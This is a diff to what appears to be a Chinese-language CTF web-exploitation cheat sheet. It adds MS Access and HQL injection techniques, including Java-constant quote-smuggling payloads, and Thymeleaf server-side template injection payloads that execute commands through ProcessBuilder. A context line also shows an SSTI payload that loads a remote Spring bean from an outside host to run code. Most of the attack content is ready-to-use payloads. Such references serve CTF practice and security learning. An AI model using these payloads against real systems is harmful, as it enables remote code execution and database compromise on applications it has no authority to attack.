@@ -14,7 +14,7 @@ Table of Contents
 *  [Command Injection](#command-injection)
     * [Bypass Space](#空白繞過)
     * [Bypass Keyword](#keyword繞過)
-    * [ImageMagick](#imagemagick-imagetragick)
+    * [ImageMagick](#imagemagick)
     * [Ruby Command Executing](#ruby-command-executing)
     * [Python Command Executing](#python-command-executing)
 *  [SQL Injection](#sql-injection)
@@ -997,9 +997,9 @@ PS1=$(cat flag)
 - 反斜線
     - `c\at fl\ag`
 
-## ImageMagick (ImageTragick)
+## ImageMagick
 
-- CVE-2016-3714
+- CVE-2016-3714 (ImageTragick)
     - `mvg` 格式包含 https 處理(使用 curl 下載)，可以閉合雙引號
     - payload:
     ```mvg
@@ -1870,6 +1870,7 @@ end
 - 沒有 Sleep, Benchmark, ...
 - 支援 Subquery
     - `'AND (SELECT TOP 1 'xxx' FROM table)%00`
+- 在 subquery 或 Union select 時，需要指定 `FROM` 
 - String Concatenation
     - `&` (`%26`)
     - `+` (`%2B`)
@@ -1877,16 +1878,21 @@ end
 - Ascii Function
     - `ASC()`
     - `'UNION SELECT ASC('A') FROM table%00`
+- Substring Function
+    - `Mid()`
+    - `Mid('admin',1,1)`
 - IF THEN
     - `IFF(condition, true, false)`
     - `'UNION SELECT IFF(1=1, 'a', 'b') FROM table%00`
-- https://insomniasec.com/cdn-assets/Access-Through-Access.pdf
+- Ref
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection/ms-access-sql-injection
 
 ## ORM injection
 
 https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications
 
 - Hibernate
+    - 不支援 UNION 語法
     - 單引號跳脫法
         - MySQL 中，單引號用 `\'` 跳脫
         - HQL 中，用兩個單引號 `''` 跳脫
@@ -1896,6 +1902,22 @@ https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-
     - Magic Function 法
         - PostgreSQL 中內建 `query_to_xml('Arbitary SQL')`
         - Oracle 中有 `dbms_xmlgen.getxml('SQL')`
+    - Java Constants
+        - 可以從 classpath 中去找 constant 來用
+        - 例如 `ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR` 在 MySQL 層就會被解成單引號 (在 HQL 層則不是)
+        - Example: DEVCORE Wargame 2024 - Spring
+            - `/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '-- '='a`
+                - HQL: 等同 `/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '[shit]'='a`
+                - MySQL: 等同 `/a'*length('a')*'[shit]'-- [shit]`
+        - 常見 Constants:
+            - `org.apache.batik.util.XMLConstants.XML_CHAR_APOS`
+            - `com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE`
+            - `jodd.util.StringPool.SINGLE_QUOTE`
+            - `ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR`
+            - `cz.vutbr.web.csskit.OutputUtil.STRING_OPENING`
+            - `com.sun.java.help.impl.DocPConst.QUOTE`
+            - `org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE`
+            - `org.apache.logging.log4j.util.Chars.QUOTE`
 
 HQL injection example (pwn2win 2017)
 
@@ -2795,6 +2817,7 @@ Server-Side Template Injection
 - Some payload
     - `__${T(java.lang.Runtime).getRuntime().availableProcessors()}__::..x`
     - `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x`
+    - `__*{new.java.lang.String(new.java.lang.ProcessBuilder('ls', '-al').start().getInputStream().readAllBytes())}__::.`
 - 高版本限制
     - 檢查 view name 是否有 expression: [src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L42-L48)
         - 繞過: `**{}` 邏輯問題 ([src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L87)) 
@@ -2807,6 +2830,8 @@ Server-Side Template Injection
     - [DDCTF 2020 - Easy Web](https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/)
     - Codegate 2023 - AI
         - from Pew: `$__|{springRequestContext.getClass().forName("org.yaml.snakeyaml.Yaml").newInstance().load(thymeleafRequestContext.httpServletRequest.getParameter("a"))}|__(xx=id)?a=!!org.springframework.context.support.FileSystemXmlApplicationContext ["https://thegrandpewd.pythonanywhere.com/pwn.bean"]`
+    - DEVCORE Wargame 2024 - Spring
+        - thymeleaf 3.0.15: `__*{new.java.lang.String(new.java.lang.ProcessBuilder('/readflag', 'give','me','the','flag').start().getInputStream().readAllBytes())}__::.`
 
 ## Golang
 
